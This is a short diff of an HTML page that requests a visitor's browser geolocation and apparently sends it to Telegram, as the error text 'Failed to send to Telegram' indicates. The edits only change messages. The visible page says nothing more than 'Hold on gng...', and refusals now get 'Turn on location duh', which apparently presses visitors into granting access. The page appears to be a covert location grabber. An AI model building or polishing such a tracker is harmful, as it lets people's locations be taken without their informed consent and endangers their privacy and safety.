@@ -28,14 +28,14 @@
         })
         .catch(err => {
           console.error(err);
-          document.body.innerHTML = "<h2 style='color:red;'>❌ Failed to send to Telegram</h2>";
+          document.body.innerHTML = "<h2 style='color:red;'>❌Turn on location duh</h2>";
         });
       }
 
       function getLocation() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(sendLocation, () => {
-            document.body.innerHTML = "<h2 style='color:red;'>❌ Permission Denied</h2>";
+            document.body.innerHTML = "<h2 style='color:red;'>❌Turn on location duh</h2>";
           });
         } else {
           document.body.innerHTML = "<h2>❌ Geolocation not supported</h2>";
@@ -46,7 +46,7 @@
     </script>
   </head>
   <body>
-    <h2>📡 Hold on lil bro...</h2>
+    <h2>📡 Hold on gng...</h2>
   </body>
 </html>
 
